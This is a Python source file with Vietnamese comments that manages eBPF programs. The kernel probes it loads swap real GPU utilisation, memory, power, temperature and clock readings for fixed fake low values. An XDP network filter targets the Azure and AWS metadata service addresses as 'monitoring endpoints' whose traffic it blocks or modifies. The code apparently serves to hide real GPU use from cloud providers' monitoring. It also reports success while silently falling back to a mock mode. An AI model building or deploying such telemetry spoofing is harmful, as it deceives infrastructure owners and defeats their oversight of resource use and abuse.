#!/usr/bin/env python3
"""
eBPF Telemetry Filter Manager
Quản lý các eBPF programs cho GPU telemetry filtering
"""

import os
import sys
import json
import time
import logging
import threading
import subprocess
import ctypes
import shutil
import re
import fcntl
import signal
import socket
import inspect
from typing import Dict, List, Optional, Any, Tuple, Union, cast
from dataclasses import dataclass
from enum import Enum

# Import BCC if available
try:
    from bcc import BPF  # type: ignore
    BCC_AVAILABLE = True
    # Ép kiểu về Any để tránh lỗi mypy khi subscript/triển khai BPF object
    BPF = cast(Any, BPF)
except ImportError:
    BCC_AVAILABLE = False
    print("⚠️ BCC not available - using mock eBPF mode")
    
    # Mock BPF class for testing/fallback
    class MockBPF:
        def __init__(self, src_file=None, text=None):
            self.programs = {}
            self.maps = {}
            
        def __getitem__(self, key):
            if key not in self.maps:
                self.maps[key] = MockMap()
            return self.maps[key]
            
        def attach_kprobe(self, event, fn_name):
            print(f"📌 Mock: Would attach kprobe {fn_name} to {event}")
            
        def attach_kretprobe(self, event, fn_name):
            print(f"📌 Mock: Would attach kretprobe {fn_name} to {event}")
            
        def attach_xdp(self, dev, fn, flags=0):
            print(f"📌 Mock: Would attach XDP {fn} to {dev}")
            
        def remove_xdp(self, dev, flags=0):
            print(f"📌 Mock: Would remove XDP from {dev}")
            
        def cleanup(self):
            print("🧹 Mock: Cleanup called")
    
    class MockMap:
        def __init__(self):
            self.data = {}
            
        def __setitem__(self, key, value):
            self.data[key] = value
            
        def __getitem__(self, key):
            return self.data.get(key, 0)
            
        def items(self):
            return self.data.items()
            
        def clear(self):
            self.data.clear()
    
    # Use mock BPF when BCC not available
    BPF = MockBPF

# Kiểm tra kernel headers và tự động fallback sang mock mode nếu cần
def check_kernel_headers() -> bool:
    """Kiểm tra xem kernel headers có sẵn sàng không"""
    kernel_version = os.uname().release
    headers_paths = [
        f"/lib/modules/{kernel_version}/build",
        f"/usr/src/linux-headers-{kernel_version}",
        f"/usr/src/kernels/{kernel_version}"
    ]
    
    # Kiểm tra tất cả các đường dẫn headers có thể
    for headers_dir in headers_paths:
        if os.path.exists(headers_dir) and os.path.isdir(headers_dir):
            if os.path.exists(f"{headers_dir}/Makefile") and os.path.isdir(f"{headers_dir}/include"):
                print(f"✅ Kernel headers found at {headers_dir}")
                return True
    
    # Nếu không tìm thấy headers trực tiếp, thử các phương pháp khác
    print(f"⚠️ Kernel headers not found in standard locations for version {kernel_version}")
    
    # Kiểm tra trong /usr/src cho header tổng quát
    generic_headers = "/usr/src/linux-headers-generic"
    if os.path.exists(generic_headers):
        print(f"✅ Generic headers found at {generic_headers}")
        try:
            # Thử tạo symlink nếu có quyền
            target_dir = f"/lib/modules/{kernel_version}/build"
            os.makedirs(os.path.dirname(target_dir), exist_ok=True)
            if not os.path.exists(target_dir):
                os.symlink(generic_headers, target_dir)
                print("✅ Successfully created symlink for kernel headers")
                return True
        except (OSError, PermissionError) as e:
            print(f"❌ Failed to create symlink: {e}")
    
    # Kiểm tra kheaders module
    try:
        result = subprocess.run(
            ["modprobe", "kheaders"], 
            stdout=subprocess.PIPE, 
            stderr=subprocess.PIPE,
            check=False
        )
        if result.returncode == 0:
            print("✅ Successfully loaded kheaders module")
            return True
        else:
            print(f"❌ Failed to load kheaders: {result.stderr.decode()}")
    except FileNotFoundError:
        print("⚠️ modprobe not found - cannot load kheaders")
    
    print("⚠️ Using mock eBPF mode - kernel headers unavailable")
    return False

# Thiết lập giá trị mặc định cho việc có sẵn eBPF
EBPF_RUNTIME_AVAILABLE = BCC_AVAILABLE and check_kernel_headers()

@dataclass
class TelemetryEvent:
    """Telemetry event data structure"""
    pid: int
    tid: int
    timestamp: int
    metric_type: int
    original_value: int
    fake_value: int
    comm: str

class MetricType(Enum):
    """GPU metric types"""
    GPU_UTIL = 0
    MEM_UTIL = 1
    POWER = 2
    TEMP = 3
    CLOCK = 4

class FilterAction(Enum):
    """Network filter actions"""
    PASS = 0
    DROP = 1
    MODIFY = 2

class EBPFTelemetryFilter:
    """Main eBPF Telemetry Filter Manager"""
    
    def __init__(self, config_path: Optional[str] = None):
        self.logger = logging.getLogger(__name__)
        self.config_path = config_path or self._get_default_config_path()
        self.config = self._load_config()
        
        # Phát hiện cấu hình và khả năng runtime
        self.mock_mode = os.environ.get("EBPF_MOCK_MODE", "auto")
        if self.mock_mode == "auto":
            self.use_mock_mode = not EBPF_RUNTIME_AVAILABLE
        elif self.mock_mode.lower() in ["true", "1", "yes"]:
            self.use_mock_mode = True
        else:
            self.use_mock_mode = not EBPF_RUNTIME_AVAILABLE
            
        if self.use_mock_mode:
            self.logger.info("🔸 eBPF using MOCK mode (simulated functionality)")
        
        # Strict mode: nếu EBPF_MOCK_MODE được đặt thành "false/0/no/strict" -> không cho fallback
        self.strict_mode = self.mock_mode.lower() in ["false", "0", "no", "strict"]
        if self.strict_mode:
            self.use_mock_mode = False
        
        # eBPF program instances
        self.bpf_programs: Dict[str, Any] = {}
        self.event_handlers: Dict[str, threading.Thread] = {}
        self.running = False
        
        # Metrics storage
        self.fake_metrics = {
            MetricType.GPU_UTIL.value: self.config.get('fake_gpu_util', 2),
            MetricType.MEM_UTIL.value: self.config.get('fake_mem_util', 5),
            MetricType.POWER.value: self.config.get('fake_power', 75),
            MetricType.TEMP.value: self.config.get('fake_temp', 45),
            MetricType.CLOCK.value: self.config.get('fake_clock', 1200)
        }
        
        # Network configuration
        self.network_config = {
            'enable_filter': self.config.get('enable_network_filter', True),
            'block_telemetry': self.config.get('block_telemetry', False),
            'modify_payload': self.config.get('modify_payload', True),
            'log_events': self.config.get('log_network_events', True)
        }
        
        # Blocked endpoints (monitoring services)
        self.blocked_endpoints = self._get_blocked_endpoints()
        
    def _get_default_config_path(self) -> str:
        """Get default configuration file path"""
        script_dir = os.path.dirname(os.path.abspath(__file__))
        return os.path.join(script_dir, '..', 'config', 'ebpf_config.json')
    
    def _load_config(self) -> Dict[str, Any]:
        """Load configuration from file"""
        try:
            if os.path.exists(self.config_path):
                with open(self.config_path, 'r') as f:
                    config = json.load(f)
                self.logger.info(f"✅ Loaded eBPF config from {self.config_path}")
                return config
            else:
                self.logger.warning(f"⚠️ Config file not found: {self.config_path}, using defaults")
                return self._get_default_config()
        except Exception as e:
            self.logger.error(f"❌ Failed to load config: {e}")
            return self._get_default_config()
    
    def _get_default_config(self) -> Dict[str, Any]:
        """Get default configuration"""
        return {
            'enable_gpu_filter': True,
            'enable_network_filter': True,
            'fake_gpu_util': 2,
            'fake_mem_util': 5,
            'fake_power': 75,
            'fake_temp': 45,
            'fake_clock': 1200,
            'block_telemetry': False,
            'modify_payload': True,
            'log_network_events': True,
            'network_interface': 'eth0',
            'log_level': 'INFO'
        }
    
    def _get_blocked_endpoints(self) -> List[str]:
        """Get list of blocked monitoring endpoints"""
        return [
            '168.63.129.16',    # Azure metadata service
            '169.254.169.254',  # AWS/Azure metadata
            '10.0.0.1',         # Common gateway
        ]
    
    def _setup_logging(self):
        """Setup logging configuration"""
        log_level = self.config.get('log_level', 'INFO')
        logging.basicConfig(
            level=getattr(logging, log_level),
            format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
        )
    
    def load_gpu_filter(self) -> bool:
        """Load eBPF program for GPU telemetry filtering"""
        if self.use_mock_mode:
            self.logger.info("🔧 Using mock eBPF mode - simulating GPU filter")
            # In mock mode, just simulate the filter loading
            self.bpf_programs['gpu'] = BPF()
            self.logger.info("✅ Mock GPU telemetry filter loaded successfully")
            return True
            
        try:
            script_dir = os.path.dirname(os.path.realpath(__file__))
            # Ưu tiên sử dụng CO-RE object đã biên dịch sẵn
            core_obj = os.path.join(script_dir, '..', 'obj', 'gpu_telemetry_filter.bpf.o')
            
            if os.path.exists(core_obj) and os.path.getsize(core_obj) > 0:
                self.logger.info(f"🔧 Sử dụng CO-RE object đã biên dịch sẵn: {core_obj}")
                try:
                    # Tải CO-RE object với hàm trợ giúp tương thích đa phiên bản
                    self.bpf_programs['gpu'] = self._load_bpf_object(core_obj)  # type: ignore[index]
                    self.logger.info("✅ CO-RE GPU telemetry filter loaded successfully")
                    return True
                except Exception as e:
                    self.logger.warning(f"⚠️ Không thể tải CO-RE object: {e}")
                    # Nếu không thể tải CO-RE object, thử biên dịch từ source
            
            # Nếu không có CO-RE object hoặc tải thất bại, biên dịch từ source
            bpf_src = os.path.join(script_dir, '..', 'src', 'gpu_telemetry_filter.bpf.c')
            if not os.path.exists(bpf_src):
                self.logger.warning(f"⚠️ Source file không tồn tại: {bpf_src}")
                bpf_src = os.path.join(script_dir, '..', 'src', 'gpu_telemetry_filter_core.bpf.c')
                if not os.path.exists(bpf_src):
                    self.logger.error(f"❌ Không tìm thấy source file eBPF")
                    self._enable_mock("GPU filter source not found")
                    return False
            
            # Load eBPF program from source
            try:
                self.logger.info("🔧 Compiling eBPF program from source...")
                self.bpf_programs['gpu'] = BPF(src_file=bpf_src)
                self.logger.info("✅ GPU telemetry filter loaded successfully")
                return True
            except Exception as e:
                error_str = str(e)
                if "kernel headers" in error_str.lower() or "failed to compile" in error_str.lower():
                    self.logger.warning(f"⚠️ Failed to compile BPF module: {e}")
                    self._enable_mock("GPU filter compilation failure")
                    self.bpf_programs['gpu'] = BPF()
                    self.logger.info("✅ Fallback: Mock GPU telemetry filter loaded")
                    return False
                else:
                    raise
        except Exception as e:
            self.logger.error(f"❌ Failed to load GPU filter: {e}")
            self._enable_mock("GPU filter general error")
            self.bpf_programs['gpu'] = BPF()
            self.logger.info("✅ Fallback: Mock GPU telemetry filter loaded after error")
            return False
    
    def load_network_filter(self) -> bool:
        """Load eBPF program for network telemetry filtering"""
        if self.use_mock_mode:
            self.logger.info("🔧 Using mock eBPF mode - simulating Network filter")
            # In mock mode, just simulate the filter loading
            self.bpf_programs['network'] = BPF()
            self.logger.info("✅ Mock Network telemetry filter loaded successfully")
            return True
            
        try:
            # Only enable network filtering if explicitly configured
            if not self.network_config['enable_filter']:
                self.logger.info("🔸 Network filtering disabled in configuration")
                return False
                
            # Get network interface to attach to
            interface = self.config.get('network_interface', 'eth0')
            if not self._interface_exists(interface):
                self.logger.warning(f"⚠️ Network interface {interface} not found, using eth0")
                interface = 'eth0'
                
            # Get path to compiled eBPF object
            script_dir = os.path.dirname(os.path.abspath(__file__))
            bpf_obj = os.path.join(script_dir, '..', 'obj', 'network_filter.o')
            bpf_src = os.path.join(script_dir, '..', 'src', 'network_filter.c')
            
            if not os.path.exists(bpf_src):
                self._enable_mock("Network filter source missing")
                self.bpf_programs['network'] = BPF()
                self.logger.info("✅ Fallback: Mock network telemetry filter loaded")
                return False
                
            # Check if pre-compiled object exists
            if os.path.exists(bpf_obj) and os.path.getsize(bpf_obj) > 0:
                try:
                    # Try loading from pre-compiled object
                    self.bpf_programs['network'] = self._load_bpf_object(bpf_obj)  # type: ignore[index]
                    self.logger.info("✅ Loaded pre-compiled Network filter")
                except Exception as e:
                    self.logger.warning(f"⚠️ Failed to load pre-compiled Network object: {e}")
                    # Continue to try compiling from source
            
            # If we couldn't load from object, try compiling from source
            if 'network' not in self.bpf_programs:
                try:
                    self.logger.info(f"🔧 Compiling network filter from source: {bpf_src}")
                    self.bpf_programs['network'] = BPF(src_file=bpf_src)
                    self.logger.info("✅ Network telemetry filter compiled successfully")
                except Exception as e:
                    error_str = str(e)
                    if "kernel headers" in error_str.lower() or "failed to compile" in error_str.lower():
                        self.logger.warning(f"⚠️ Failed to compile network BPF module: {e}")
                        self._enable_mock("Network filter compilation failure")
                        self.bpf_programs['network'] = BPF() 
                        
                        # Create mock object for future reference
                        os.makedirs(os.path.dirname(bpf_obj), exist_ok=True)
                        with open(bpf_obj, 'w') as f:
                            f.write("/* Mock object created due to network filter compilation failure */\n")
                            
                        self.logger.info("✅ Fallback: Mock network filter loaded")
                        return False
                    else:
                        raise
            
            # Configure blocked endpoints
            if 'blocked_endpoints' in self.bpf_programs['network']:
                endpoints_map = self.bpf_programs['network']['blocked_endpoints']
                for i, ip in enumerate(self.blocked_endpoints):
                    try:
                        ip_int = self._ip_to_int(ip)
                        endpoints_map[ctypes.c_int(i)] = ctypes.c_uint32(ip_int)
                    except Exception as e:
                        self.logger.warning(f"⚠️ Failed to add blocked endpoint {ip}: {e}")
            
            # Attach to XDP hook
            try:
                self.logger.info(f"📌 Attaching XDP hook to interface: {interface}")
                self.bpf_programs['network'].attach_xdp(interface, fn="xdp_filter", flags=0)
                self.logger.info(f"✅ Network filter attached to {interface}")
                
                # Start event handler thread
                self._start_network_event_handler()
                
                return True
            except Exception as e:
                self.logger.error(f"❌ Failed to attach XDP hook: {e}")
                self._enable_mock("Network filter attach/start error")
                return False
                
        except Exception as e:
            self.logger.error(f"❌ Failed to start network filter: {e}")
            self._enable_mock("Network filter general error")
            self.bpf_programs['network'] = BPF()
            self.logger.info("✅ Fallback: Mock network filter loaded after error")
            return False
    
    def _interface_exists(self, interface: str) -> bool:
        """Check if network interface exists"""
        try:
            result = subprocess.run(['ip', 'link', 'show', interface], 
                                  capture_output=True, text=True)
            return result.returncode == 0
        except:
            return False
    
    def _ip_to_int(self, ip_str: str) -> int:
        """Convert IP string to integer"""
        parts = ip_str.split('.')
        return (int(parts[0]) << 24) + (int(parts[1]) << 16) + (int(parts[2]) << 8) + int(parts[3])
    
    def _start_gpu_event_handler(self):
        """Start GPU event handler thread"""
        if 'gpu' not in self.bpf_programs:
            return
            
        def handle_gpu_events():
            try:
                bpf_gpu = self.bpf_programs.get('gpu')
                if not self._is_valid_bpf(bpf_gpu):
                    self.logger.error("GPU BPF object is invalid; skipping GPU event handler")
                    return

                events_map = bpf_gpu['events']
                while self.running:
                    try:
                        events_map.open_ring_buffer(self._process_gpu_event)
                        events_map.ring_buffer_poll(timeout=1000)
                    except Exception as e:
                        if self.running:
                            self.logger.debug(f"GPU event handler error: {e}")
                        time.sleep(0.1)
            except Exception as e:
                self.logger.error(f"❌ GPU event handler failed: {e}")
        
        self.event_handlers['gpu'] = threading.Thread(target=handle_gpu_events, daemon=True)
        self.event_handlers['gpu'].start()
        self.logger.info("✅ GPU event handler started")
    
    def _start_network_event_handler(self):
        """Start network event handler thread."""
        if self.use_mock_mode:
            self.logger.debug("Skipping event handler in mock mode")
            return

        def handle_network_events():
            """Handle network events from BPF program."""
            bpf_net = self.bpf_programs.get('network')
            if not self._is_valid_bpf(bpf_net):
                self.logger.warning("Network BPF program not loaded or invalid; cannot handle events")
                return

            if not hasattr(bpf_net, 'events') or not bpf_net['events']:
                self.logger.debug("Network events table not found, skipping event handler")
                return
                
            self.logger.info("Network event handler started")
            
            try:
                # Đăng ký callback function để xử lý network events
                bpf_net["events"].open_perf_buffer(
                    self._process_network_event, page_cnt=64
                )
                
                # Vòng lặp đọc network events
                while self.running:
                    try:
                        bpf_net.perf_buffer_poll(timeout=100)
                    except Exception as e:
                        if self.running:  # Only log if we're still supposed to be running
                            self.logger.debug(f"Error polling network events: {e}")
                    time.sleep(0.1)
            except Exception as e:
                self.logger.error(f"Error in network event handler: {e}")
        
        # Start thread if not in mock mode
        if not self.use_mock_mode:
            self.event_handlers['network'] = threading.Thread(
                target=handle_network_events, daemon=True
            )
            self.event_handlers['network'].start()
    
    def _process_gpu_event(self, cpu, data, size):
        """Process GPU telemetry events"""
        try:
            bpf_gpu = self.bpf_programs.get('gpu')
            if not self._is_valid_bpf(bpf_gpu):
                return

            event = bpf_gpu['events'].event(data)
            
            metric_name = {
                0: "GPU_UTIL",
                1: "MEM_UTIL", 
                2: "POWER",
                3: "TEMP",
                4: "CLOCK"
            }.get(event.metric_type, "UNKNOWN")
            
            self.logger.debug(
                f"🎭 GPU Event: PID={event.pid} {metric_name} "
                f"original={event.original_value} fake={event.fake_value} "
                f"comm={event.comm.decode('utf-8', errors='ignore')}"
            )
            
        except Exception as e:
            self.logger.debug(f"Error processing GPU event: {e}")
    
    def _process_network_event(self, cpu, data, size):
        """Process network telemetry events"""
        try:
            bpf_net = self.bpf_programs.get('network')
            if not self._is_valid_bpf(bpf_net):
                return

            event = bpf_net['network_events'].event(data)
            
            action_name = {0: "PASS", 1: "DROP", 2: "MODIFY"}.get(event.action, "UNKNOWN")
            
            self.logger.debug(
                f"🌐 Network Event: {self._int_to_ip(event.src_ip)}:{event.src_port} -> "
                f"{self._int_to_ip(event.dst_ip)}:{event.dst_port} "
                f"proto={event.protocol} action={action_name}"
            )
            
        except Exception as e:
            self.logger.debug(f"Error processing network event: {e}")
    
    def _int_to_ip(self, ip_int: int) -> str:
        """Convert integer to IP string"""
        return f"{(ip_int >> 24) & 0xFF}.{(ip_int >> 16) & 0xFF}.{(ip_int >> 8) & 0xFF}.{ip_int & 0xFF}"
    
    def start_filtering(self) -> bool:
        """Start eBPF filtering"""
        if self.running:
            self.logger.info("✓ eBPF filtering already running")
            return True
        
        # Track start status
        gpu_filter_ok = False
        network_filter_ok = False
        
        # Ghi log biến môi trường để gỡ lỗi
        self.logger.info(f"🔧 Environment: EBPF_MOCK_MODE={os.environ.get('EBPF_MOCK_MODE', 'not set')}")
        
        # Kiểm tra lại kernel headers
        if not check_kernel_headers() and self.mock_mode == "auto":
            self.logger.warning("⚠️ Kernel headers not available")
            self._enable_mock("Kernel headers not available")
            os.environ["EBPF_MOCK_MODE"] = "true"
        
        # Load GPU filter if enabled
        if self.config.get('filter_settings', {}).get('enable_gpu_filter', True):
            try:
                gpu_filter_ok = self.load_gpu_filter()
                if not gpu_filter_ok:
                    self.logger.warning("⚠️ GPU filter failed to start")
            except Exception as e:
                self.logger.error(f"❌ Failed to start GPU filter: {str(e)}")
                self.logger.warning("⚠️ Detected NoneType error - switching to mock mode")
                self._enable_mock("GPU filter start encountered NoneType error")
        
        # Load Network filter if enabled
        if self.config.get('filter_settings', {}).get('enable_network_filter', True):
            try:
                network_filter_ok = self.load_network_filter()
                if not network_filter_ok:
                    self.logger.warning("⚠️ Network filter failed to start")
            except Exception as e:
                self.logger.error(f"❌ Failed to start network filter: {str(e)}")
                self.logger.warning("⚠️ Detected NoneType/concat error - switching to mock mode")
                self._enable_mock("Network filter start encountered error")
        
        # Thiết lập trạng thái chạy và ghi nhật ký
        if self.use_mock_mode:
            self.logger.warning("⚠️ eBPF Telemetry Filter running in MOCK MODE (simulated)")
            self.running = True
            # Tạo các đối tượng BPF giả lập để cho phép tiếp tục hoạt động nếu không ở strict mode
            if not getattr(self, "strict_mode", False):
                self.bpf_programs['gpu'] = BPF()
                self.bpf_programs['network'] = BPF()
            return True
        elif gpu_filter_ok or network_filter_ok:
            if not (gpu_filter_ok and network_filter_ok):
                self.logger.warning("⚠️ eBPF Telemetry Filter started with some failures")
            else:
                self.logger.info("✅ eBPF Telemetry Filter started successfully")
            self.running = True
            return True
        else:
            self.logger.error("❌ Failed to start eBPF filtering - switching to mock mode")
            self._enable_mock("Failed to start eBPF filtering - both GPU and network filters failed")
            self.running = True
            # Tạo các đối tượng BPF giả lập để cho phép tiếp tục hoạt động nếu không ở strict mode
            if not getattr(self, "strict_mode", False):
                self.bpf_programs['gpu'] = BPF()
                self.bpf_programs['network'] = BPF()
            return False
    
    def stop_filtering(self):
        """Stop and cleanup eBPF programs"""
        self.running = False
        
        # Stop event handlers
        for name, thread in self.event_handlers.items():
            if thread.is_alive():
                thread.join(timeout=2)
                self.logger.info(f"🛑 Stopped {name} event handler")
        
        # Cleanup eBPF programs
        for name, program in self.bpf_programs.items():
            try:
                program.cleanup()
                self.logger.info(f"🛑 Cleaned up {name} eBPF program")
            except Exception as e:
                self.logger.error(f"❌ Error cleaning up {name} program: {e}")
        
        self.bpf_programs.clear()
        self.event_handlers.clear()
        self.logger.info("🛑 eBPF Telemetry Filter stopped")
    
    def update_fake_metrics(self, metrics: Dict[str, int]):
        """Update fake metric values"""
        for metric_name, value in metrics.items():
            if hasattr(MetricType, metric_name.upper()):
                metric_type = getattr(MetricType, metric_name.upper()).value
                self.fake_metrics[metric_type] = value
                
                # Update eBPF map if GPU filter is loaded
                if 'gpu' in self.bpf_programs and 'fake_metrics' in self.bpf_programs['gpu']:
                    self.bpf_programs['gpu']['fake_metrics'][metric_type] = value
                
                self.logger.info(f"📊 Updated fake {metric_name}: {value}")
    
    def get_status(self) -> Dict[str, Any]:
        """Get current filter status"""
        return {
            'running': self.running,
            'bcc_available': BCC_AVAILABLE,
            'programs_loaded': list(self.bpf_programs.keys()),
            'event_handlers': list(self.event_handlers.keys()),
            'fake_metrics': self.fake_metrics,
            'config': self.config
        }

    # -------------------------------------------------------------
    # Helper: validate that a BPF object is usable (not None)
    # -------------------------------------------------------------
    @staticmethod
    def _is_valid_bpf(bpf_obj: "BPF") -> bool:  # type: ignore
        """Return True nếu đối tượng BPF hợp lệ (không phải None/mocking lỗi)."""
        return bpf_obj is not None and getattr(bpf_obj, "__class__", None) is not None

    # -------------------------------------------------------------
    # Helper: chuyển sang mock mode, tôn trọng strict_mode
    # -------------------------------------------------------------
    def _enable_mock(self, reason: str = ""):
        """Bật mock mode trừ khi strict_mode đang active, khi đó raise RuntimeError"""
        if getattr(self, "strict_mode", False):
            raise RuntimeError(f"Strict eBPF mode enabled – cannot fallback to mock. Reason: {reason}")
        self.logger.warning(f"⚠️ Falling back to MOCK mode. {reason}")
        self.use_mock_mode = True

    # -------------------------------------------------------------
    # Helper: load BPF object with backward-compatible parameters
    # -------------------------------------------------------------
    @staticmethod
    def _load_bpf_object(obj_path: str):  # type: ignore[return-value]
        """Load a pre-compiled eBPF object regardless of BCC version."""
        sig_params = inspect.signature(BPF).parameters  # type: ignore[arg-type]
        if "open_file" in sig_params:
            return BPF(open_file=obj_path)  # type: ignore[call-arg]
        if "obj" in sig_params:
            return BPF(obj=obj_path)  # type: ignore[call-arg]
        if "src_file" in sig_params:
            return BPF(src_file=obj_path)  # type: ignore[call-arg]
        raise RuntimeError("Không tìm thấy tham số phù hợp để tải BPF object trong phiên bản BCC hiện tại")

# Convenience functions for integration
def create_ebpf_filter(config_path: Optional[str] = None) -> EBPFTelemetryFilter:
    """Create eBPF telemetry filter instance"""
    return EBPFTelemetryFilter(config_path)

def is_ebpf_available() -> bool:
    """
    Kiểm tra xem eBPF có khả dụng trên hệ thống hay không.
    
    Returns:
        bool: True nếu eBPF khả dụng, False nếu không.
    """
    # Nếu wrapper mode đã được bật, luôn trả về True
    if os.environ.get("ENABLE_EBPF_WRAPPER", "0").lower() in ["1", "true", "yes"]:
        logging.info("eBPF wrapper mode đang được kích hoạt - giả lập khả dụng")
        return True
        
    # Kiểm tra BCC
    bcc_available = BCC_AVAILABLE
    
    # Kiểm tra kernel headers
    kernel_version = os.uname().release
    headers_dir = f"/lib/modules/{kernel_version}/build"
    headers_available = os.path.exists(headers_dir) and os.path.exists(f"{headers_dir}/Makefile")
    
    # Kiểm tra quyền root
    root_access = os.geteuid() == 0
    
    # Kiểm tra bpftool
    bpftool_available = shutil.which("bpftool") is not None
    
    # Kiểm tra modprobe
    modprobe_available = shutil.which("modprobe") is not None
    
    # Mock mode từ biến môi trường
    mock_env = os.environ.get("EBPF_MOCK_MODE", "auto").lower()
    if mock_env in ["true", "1", "yes"]:
        return False
    elif mock_env in ["false", "0", "no"]:
        return True
    
    # Thử tải một BPF object đơn giản để kiểm tra xem libbcc có lỗi "undefined symbol" không
    try:
        if bcc_available:
            # Tạo BPF mini test script
            mini_script = """
            #include <linux/ptrace.h>
            int simple_prog(void *ctx) { return 0; }
            """
            # Thử tải để xác nhận không có lỗi symbol
            BPF(text=mini_script)
            logging.info("BPF mini-test thành công - eBPF khả dụng")
    except Exception as e:
        if "undefined symbol" in str(e):
            logging.error(f"Phát hiện lỗi undefined symbol: {e}")
            logging.info("Kích hoạt wrapper mode để khắc phục")
            os.environ["ENABLE_EBPF_WRAPPER"] = "1"
            return True
        logging.warning(f"BPF mini-test thất bại với lỗi: {e}")
    
    # Tính toán khả dụng của eBPF dựa trên các yếu tố
    return bcc_available and headers_available and root_access and (bpftool_available or modprobe_available)

if __name__ == "__main__":
    # Test the eBPF filter
    logging.basicConfig(level=logging.INFO)
    
    filter_manager = EBPFTelemetryFilter()
    
    try:
        if filter_manager.start_filtering():
            print("✅ eBPF Telemetry Filter started successfully")
            print("Press Ctrl+C to stop...")
            
            while True:
                time.sleep(1)
                status = filter_manager.get_status()
                print(f"Status: {status['programs_loaded']}")
                
    except KeyboardInterrupt:
        print("\n🛑 Stopping eBPF filter...")
        filter_manager.stop_filtering()
        print("✅ eBPF filter stopped")